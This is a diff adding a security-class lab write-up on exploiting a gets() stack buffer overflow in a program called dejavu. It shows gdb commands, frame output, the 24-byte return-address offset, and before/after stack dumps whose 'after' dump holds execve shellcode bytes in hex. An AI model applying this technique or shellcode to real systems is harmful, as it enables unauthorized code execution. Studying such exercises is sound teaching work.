@@ -1,0 +1,68 @@
+We know that the buffer in the exploitable code is exactly 8 bytes long, and
+because gets() does not check for input size, and because this is a security
+class in which we are to break into a VM, we can deduce, logically, that some
+important pointer is stored on the stack at a convenient location after the
+buffer. Unsurprisingly, this is true, as when we use the commands in gdb:
+
+    b 7
+    r
+    i f 0
+    x/16x
+
+we see the following output:
+
+    (gdb) b 7
+    Breakpoint 1 at 0x8048412: file dejavu.c, line 7.
+    (gdb) r
+    Starting program: /home/vsftpd/dejavu
+    
+    Breakpoint 1, deja_vu () at dejavu.c:7
+    7         gets(door);
+    (gdb) i f 0
+    Stack frame at 0xbffff840:
+     eip = 0x8048412 in deja_vu (dejavu.c:7); saved eip 0x804842a
+     called by frame at 0xbffff850
+     source language c.
+     Arglist at 0xbffff838, args:
+     Locals at 0xbffff838, Previous frame's sp is 0xbffff840
+     Saved registers:
+      ebp at 0xbffff838, eip at 0xbffff83c
+    (gdb) x/16x door
+    0xbffff828:     0xbffff8ec      0xb7e5f225      0xb7fed270      0x00000000
+    0xbffff838:     0xbffff848      0x0804842a      0x08048440      0x00000000
+    0xbffff848:     0x00000000      0xb7e454d3      0x00000001      0xbffff8e4
+    0xbffff858:     0xbffff8ec      0xb7fdc858      0x00000000      0xbffff81c
+
+Conveniently, the saved return address is exactly 24 bytes away from the beginning
+of the buffer. Inconveniently, this is not enough space to put the shellcode at
+the beginning of the buffer without messing with the stack pointer. So we just 
+wrote the address of the spot after where the RIP is stored 6 times (6x4=24), and
+put our shellcode immediately after that. We had to write each byte backwards,
+however, due to how x86 systems fill buffers on the stack. This, however, was
+trivial in the grander scheme of things.
+
+Before stack:
+
+(gdb) x/32x door
+
+    0xbffff828:     0xbffff8ec      0xb7e5f225      0xb7fed270      0x00000000
+    0xbffff838:     0xbffff848      0x0804842a      0x08048440      0x00000000
+    0xbffff848:     0x00000000      0xb7e454d3      0x00000001      0xbffff8e4
+    0xbffff858:     0xbffff8ec      0xb7fdc858      0x00000000      0xbffff81c
+    0xbffff868:     0xbffff8ec      0x00000000      0x0804821c      0xb7fd2000
+    0xbffff878:     0x00000000      0x00000000      0x00000000      0x06cf11f2
+    0xbffff888:     0x319695e2      0x00000000      0x00000000      0x00000000
+    0xbffff898:     0x00000001      0x08048320      0x00000000      0xb7ff26a0
+
+After stack:
+
+    (gdb) x/32x door
+    0xbffff828:     0xbffff840      0xbffff840      0xbffff840      0xbffff840
+    0xbffff838:     0xbffff840      0xbffff840      0x895e1feb      0xc0310876
+    0xbffff848:     0x89074688      0x0bb00c46      0x4e8df389      0x0c568d08
+    0xbffff858:     0xdb3180cd      0xcd40d889      0xffdce880      0x622fffff
+    0xbffff868:     0x732f6e69      0x00000068      0x0804821c      0xb7fd2000
+    0xbffff878:     0x00000000      0x00000000      0x00000000      0x06cf11f2
+    0xbffff888:     0x319695e2      0x00000000      0x00000000      0x00000000
+    0xbffff898:     0x00000001      0x08048320      0x00000000      0xb7ff26a0
+
